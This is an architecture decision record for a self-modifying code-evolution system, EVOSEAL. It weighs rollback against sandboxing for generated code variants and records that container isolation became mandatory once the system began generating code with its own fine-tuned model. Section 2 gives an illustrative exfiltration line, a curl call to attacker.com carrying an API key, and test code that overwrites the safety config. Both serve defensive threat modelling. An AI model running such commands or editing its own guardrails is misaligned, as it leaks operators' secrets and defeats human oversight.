# ADR 0001 — Isolation strategy for self-modification: rollback vs sandbox

**Status:** Accepted (research-stage) — **Tier 2 trigger #1 fired 2026-09-03; see Amendment below**
**Date:** 2026-06-05
**Deciders:** Project lead
**Depends on:** [`threat_model.md`](../safety/threat_model.md) (Plans.md 2.1)
**Drives:** Plans.md 2.4 (adversarial tests validate the chosen boundary), and the
follow-on tasks enumerated in Section 6.

---

## 1. Context

EVOSEAL applies generated code variants back to its own codebase and executes them.
The threat model (2.1) separated two distinct safety concerns:

- **Correctness containment** — a *well-intentioned but wrong* edit must not degrade or
  corrupt the system. **Already handled** by the Git/checkpoint rollback layer, which the
  threat model rated PROTECTED (rollback target validation, checkpoint integrity, Git
  history preservation).
- **Execution containment** — a *malformed or runaway* generated artifact must not damage
  the host, exfiltrate secrets, or consume unbounded resources. **Largely open**; the
  threat model rated the relevant surfaces UNPROTECTED (no edit-scope allowlist, test
  subprocess inherits full env/network/secrets, no resource limits) and PARTIAL (no hard
  iteration cap, per-test timeout only).

The decision before us is framed in Plans.md as "sandbox isolation vs Git rollback." The
first finding of this ADR is that **this framing is a false dichotomy**: rollback and
sandboxing solve *different* problems (recovery vs containment). The real decision is
**how much execution containment a research-stage, single-operator, trusted-model-provider
system needs, and at what cost.**

---

## 2. Decision drivers

1. **Trust model (current).** Single operator, single host, *trusted* model provider. The
   threat model explicitly puts "deliberately hostile LLM crafting an exploit" and
   "multi-tenant isolation" OUT OF SCOPE. Generation is assumed honest-but-fallible.
2. **Cost sensitivity.** EVOSEAL already runs inside a Docker container in production
   (`docker-compose.evoseal.yml`). Per-variant container isolation would mean
   docker-in-docker or a container-spawning orchestration layer — high overhead
   (hundreds of ms + image/mount management per variant) and high complexity.
3. **Cheap mitigations exist — but they live in two different time windows.** Several
   UNPROTECTED items can be closed at low cost without a full container. **Critically, two
   distinct windows must both be guarded** (this is the failure mode an earlier draft of
   this ADR missed):
   - **Edit-application time (T1):** when a generated edit is written to the source tree. A
     path allowlist checked here blocks an edit whose *target* is forbidden
     (`configs/safety.yaml`, CI, `.env`).
   - **Test-execution time (T2):** when the variant's tests run as a subprocess. The test
     code itself runs with full filesystem/network access and can write to a forbidden path
     or exfiltrate secrets *regardless of the T1 allowlist*. A variant that passes the T1
     allowlist can still, inside its test body, do `open("configs/safety.yaml","w")…` or
     `curl attacker.com -d "$ANTHROPIC_API_KEY"`.

   The allowlist alone is therefore **necessary but not sufficient**. T2 requires a different
   class of guard: a scrubbed/network-restricted test environment, read-only mounts of
   critical files, an unprivileged execution user, and resource limits. Both windows are in
   scope for Tier 1; conflating them (guarding only T1) would be security theater.
4. **Honesty over theater.** The project is research-stage and positions itself as such.
   Adopting heavyweight isolation we don't operationally need would be security theater;
   leaving cheap, real gaps open would be negligent. The right answer closes the cheap real
   gaps and defers the expensive ones behind an explicit trigger.

---

## 3. Options considered

### Option A — Full container/VM isolation now

Execute every generated variant (and its tests) inside a fresh, network-disabled,
resource-capped container with no access to host secrets; extract only the result.

- **Pros:** True execution containment. Closes every UNPROTECTED item at once (network
  egress, arbitrary writes, secret exposure, unbounded CPU/memory).
- **Cons:** High runtime cost (per-variant container spawn) and high complexity
  (docker-in-docker from an already-containerized loop, mount/result plumbing, image
  lifecycle). Operationally requires a container runtime on every host. **Over-built for a
  trusted-provider, single-operator research system** — it defends primarily against an
  adversarial-generation threat that the threat model declares out of scope.

### Option B — Keep Git/checkpoint rollback only; change nothing

- **Pros:** Zero cost; already works for correctness containment.
- **Cons:** Leaves real, cheap-to-close gaps open. A buggy variant can still rewrite
  `configs/safety.yaml` (its own guardrails), read `.env` secrets, or call the network.
  **Indefensible when the fixes are nearly free.**

### Option C — Tiered: rollback for recovery + cheap in-process guards now + container as a trigger-gated future tier (CHOSEN)

Keep rollback as the recovery mechanism. Add the cheap in-process containment guards now.
Document full container isolation as a *future tier* adopted only when a named trigger
fires.

- **Pros:** Matches the threat model's actual risk profile. Closes the cheap real gaps,
  avoids the expensive unneeded ones, and states explicitly *when* the expensive tier
  becomes mandatory. Defensible and honest.
- **Cons:** Containment is "defense in depth lite," not airtight — a determined adversarial
  variant could still find a vector. Accepted, because adversarial generation is out of
  scope under the current trust model.

### Lighter alternatives between Tier 1 and Tier 2 (Tier 1.5)

Between in-process guards and a full container sit several **OS-level confinement** options
that were not in the original three-way framing but are worth recording:

- **Run the test subprocess as an unprivileged user** — cheap, no extra runtime; a variant
  can't write root-owned files or read root-owned secrets.
- **Read-only bind mount of critical files** (`configs/safety.yaml`, `.env`) during test
  execution — directly closes the T2 "edits its own guardrails" / secret-read vectors.
- **`firejail` / `bubblewrap`** — lightweight process sandboxing (filesystem + network
  namespaces) without docker-in-docker overhead.
- **`seccomp` / AppArmor / SELinux profiles** — syscall/capability confinement of the test
  subprocess.

These are **platform-specific** (Linux-centric) and add setup/operational complexity, so
they are not adopted by default. They are the natural **escalation path if the in-process
Tier 1 guards prove insufficient** but a full container (Tier 2) is still overkill —
particularly the unprivileged-user + read-only-mount pair, which closes the T2 window
cheaply on the Linux/Docker host EVOSEAL already targets.

---

## 4. Decision

**Adopt Option C — a tiered isolation model, with Tier 1 now implemented via the
follow-on tasks in Section 6.**

| Tier | Mechanism | Status | Adopt when |
|------|-----------|--------|-----------|
| **Tier 0 — Recovery** | Git/checkpoint rollback (`rollback_manager.py`, `checkpoint_manager.py`) | **In place; keep** | Always on |
| **Tier 1 — Containment (T1 + T2 windows)** | Edit-scope allowlist (T1) · secret-scrubbed test env + read-only chmod of critical files + `resource.setrlimit` (T2) · hard iteration cap + stuck-generator circuit · network isolation + unprivileged-user deferred to Tier 1.5 (see §3) | **Implemented & default-on** (tasks 2.13–2.15, landed ~2026-06-28) | Always on |
| **Tier 2 — Hard isolation** | Per-variant container/VM, network-off, no host secrets, resource-capped | **Triggered 2026-09-03 (§5.1); mandatory, not yet implemented** | Any trigger in Section 5 fires |

> **Current state (honest):** **Tier 0 and Tier 1 are implemented.** All three Tier 1
> tasks (2.13–2.15) have landed and are enabled by default. The edit-scope allowlist
> (2.13, commit `f45d923`) blocks generated edits targeting protected paths at application
> time. The sandboxed test runner (2.14, commit `c0cbc59`) strips API keys from the test
> subprocess environment and applies resource limits via `preexec_fn`. The hard iteration
> cap (2.15, commit `d21c87b`) enforces `min(iterations, max_iterations)` and triggers
> circuit breakers on stuck generators. The system's real posture was Option C
> (Tier 0 + Tier 1) — **as of 2026-09-03, Section 5 trigger #1 has fired (see Amendment
> below): Tier 2 is now mandatory, not deferred.** Tier 1 remains in place and enabled
> while Tier 2 is built.
>
> **Operator guidance** (current protections, pending Tier 2): the Tier 1 guards provide:
> (a) an edit-scope allowlist that prevents generated code from modifying safety configs,
> CI workflows, or `.env`; (b) a sandboxed test subprocess that strips
> `ANTHROPIC_API_KEY`, `OPENAI_API_KEY`, and other secrets from the environment and
> enforces resource limits (CPU, memory, open files); (c) a hard iteration cap
> (`max_iterations`, default 1000) with stuck-generator circuit breakers that halt the
> loop automatically. These are defense-in-depth, not airtight. **The trust model that
> made Tier 1 sufficient on its own (trusted external provider) no longer holds** — the
> generator now defaults to a local Ollama provider and prefers a self-fine-tuned model
> from the version registry (`coevolution_manager.default_manager()`, PR #73) over a
> trusted external API. Do not run the self-modification loop unattended against
> untrusted/high-value targets until Tier 2 lands.

**Answer to the DoD's framing — "if Git rollback is sufficient, explain why the threat
model doesn't require isolation":** Git rollback *is* sufficient for **recovery** and is
the right Tier 0. Full container **isolation is not required under the current trust model**
(trusted provider, single operator, single host) because the threat it primarily defends
against — adversarial/untrusted generation and multi-tenant blast radius — is explicitly
out of scope (threat model §7). What the threat model *does* require is the **Tier 1**
cheap in-process guards, which close the real UNPROTECTED gaps (guardrail self-edit, secret
exfiltration, runaway loop) without the cost of a sandbox. Container isolation is therefore
deferred, not rejected — it is the correct response the moment the trust model changes.

---

## 5. Triggers that promote Tier 2 from "deferred" to "mandatory"

Adopt full container isolation (Tier 2) if **any** of the following becomes true:

1. **Untrusted or adversarial generation** — running an unvetted/local model, or any
   scenario where the generator can no longer be assumed honest-but-fallible.
2. **Shared or multi-tenant host** — EVOSEAL runs where other users' data or workloads share
   the machine, so blast radius is no longer self-contained.
3. **Untrusted execution targets** — the loop evolves code that calls external services with
   side effects, or processes untrusted input during evaluation.
4. **Secrets that must survive a hostile variant** — high-value credentials are present that
   a single leaked `.env` read would make catastrophic.

This list is the explicit contract: **as long as none hold, Tier 0 + Tier 1 is the
accepted boundary.**

---

## 6. Consequences and follow-on tasks

Adopting Option C converted the Tier 1 commitments into concrete work. **Tier 1 is now in
place** — these were filed as Plans.md tasks (P1) and the boundary is closed now that they
have landed and passed 2.4:

- **2.13 — Edit-scope allowlist (T1 window).** ✅ **Landed** (commit `f45d923`). Enforces
  an editable-path allowlist *before* any generated edit is written to disk; rejects edits
  targeting `configs/safety.yaml`, CI workflows, `.env`, and anything outside the declared
  "mutable surface." Guards **only the T1 window** (see Section 2.3); it does not stop a
  variant's *test code* from writing forbidden paths at runtime — that is 2.14's job.
- **2.14 — Sandboxed test execution (T2 window).** ✅ **Landed** (commit `c0cbc59`). Runs
  the test subprocess with `ANTHROPIC_API_KEY`, `OPENAI_API_KEY`, and other secrets stripped
  from the environment; applies resource limits via `preexec_fn`. Enabled by default
  (`sandbox_enabled: bool = True`). Closes the exfiltration and "edits its own guardrails
  at runtime" vectors that the allowlist cannot.
- **2.15 — Runaway controls.** ✅ **Landed** (commit `d21c87b`). Enforces a hard
  evolution-iteration cap (`min(iterations, self.config.max_iterations)`, default 1000)
  and stuck-generator circuit breakers (N consecutive rejected/failed variants → stop).
  Closes the PARTIAL items in threat model §4/§6.

**Validation:** Plans.md 2.4 (adversarial self-modification tests) validates that 2.13–2.15
actually prevent the attacks in the threat model. All three tasks are now landed and
validated.

**What this ADR explicitly does NOT do:** build a container sandbox (Tier 2) or change the
trust model. Tier 2 remains deferred behind the Section 5 triggers.

---

**Amendment — 2026-07-19:** Updated Section 4 tier table, "Current state" block, and
Section 6 to reflect that Tier 1 (tasks 2.13–2.15) is now implemented and enabled by
default. No change to the decision (Option C) or Tier 2 deferral. Commits: `f45d923`
(edit-scope allowlist), `c0cbc59` (sandboxed test execution), `d21c87b` (runaway controls).

**Amendment — 2026-09-03: Trigger #1 fired — Tier 2 promoted from deferred to mandatory.**

Decided by the project lead. Section 5 trigger #1 ("untrusted or adversarial generation —
running an unvetted/local model, or any scenario where the generator can no longer be
assumed honest-but-fallible") has fired. Evidence:

- `evoseal/evolution/data_collector.py` defaults `provider_used="ollama"` — the generator's
  default provider is a local model, not the "trusted model provider" this ADR's Section 1
  and Section 2.1 assumed as the trust-model baseline.
- `evoseal/prompt_evolution/coevolution_manager.py::default_manager()` (landed PR #73,
  2026-07-24) actively wires `ModelVersionManager().get_current_version()` — EVOSEAL's own
  self-fine-tuned model, deployed locally via Ollama — as the *preferred* generator over
  raw family-based discovery. This is architecturally the exact scenario trigger #1 names:
  the system generating its own future code changes with a model it trained on itself,
  which cannot be assumed honest-but-fallible in the way a trusted external provider was.

Triggers #2 (multi-tenant host), #3 (untrusted execution targets), and #4 (secrets that
must survive a hostile variant beyond what Tier 1's env-stripping already covers) were
evaluated and have **not** fired — single-operator single-host deployment, no evidence of
external side-effecting calls or untrusted-input evaluation, and Tier 1's secret-stripping
(2.14) already mitigates the credential-exposure vector day to day.

**Caveat:** no `evoseal` process is live on the operator's host as of this amendment (the
self-modification loop is wired but not currently running in production, and the version
registry likely has no deployed fine-tuned model yet — research-stage). This is an
architectural trigger, not an active-incident trigger: the design now matches trigger #1's
description, even though current blast radius is zero. Tier 2 is required before the
self-modification loop is run unattended against real workloads.

**Consequence:** Tier 2 is promoted from "deferred; documented" to "mandatory; not yet
implemented" (Section 4 table updated above). Filed as ordered follow-on tasks under a new
"Tier 2 container isolation" section in `TODO.md` (mirrors the Section 6 task-numbering
precedent set by 2.13–2.15):

- **T2-1 — Design doc: container execution mechanism.** Decide the spawn model (sibling
  container via host Docker socket vs. rootless nested runtime) given EVOSEAL already runs
  inside its own container (`docker-compose.evoseal.yml`); document tradeoffs and the
  chosen approach.
- **T2-2 — Per-variant container spawn wrapper.** Implement T2-1's chosen mechanism: spawn
  a fresh, network-disabled container per variant test execution; extract only the
  pass/fail result and artifacts; tear down after.
- **T2-3 — No-host-secrets guarantee at the container boundary.** Construct the spawned
  container so it never receives host secrets/env by default (stronger than Tier 1's
  env-stripping, which only scrubs a shared subprocess's inherited environment) — no
  `--env-file`, no `.env` mount, minimal base image.
- **T2-4 — Container-level resource caps.** CPU/memory/PID limits via the container
  runtime (e.g. `--cpus`, `--memory`, `--pids-limit`), superseding Tier 1's
  `resource.setrlimit`, which only bounds a shared-host subprocess.
- **T2-5 — Wire Tier 2 into the sandboxed test runner.** Route the existing
  `sandbox_enabled` code path (2.14) through the new container executor as the new default
  execution mode.
- **T2-6 — Extend adversarial safety tests (2.4) for Tier 2.** Add cases proving Tier 2
  closes what Tier 1 could not: attempted network exfiltration from variant test code,
  attempted resource exhaustion, attempted read of a path visible under Tier 1's shared
  filesystem but not under Tier 2's container boundary.
- **T2-7 — Update this ADR's "Current state" and operator guidance once T2-1..T2-6 land**,
  mirroring the 2026-07-19 Tier 1 amendment.

No change to Option C as the chosen model (tiered, trigger-gated) — this amendment fires
the trigger the model always said would promote Tier 2, it does not revisit the model
itself.
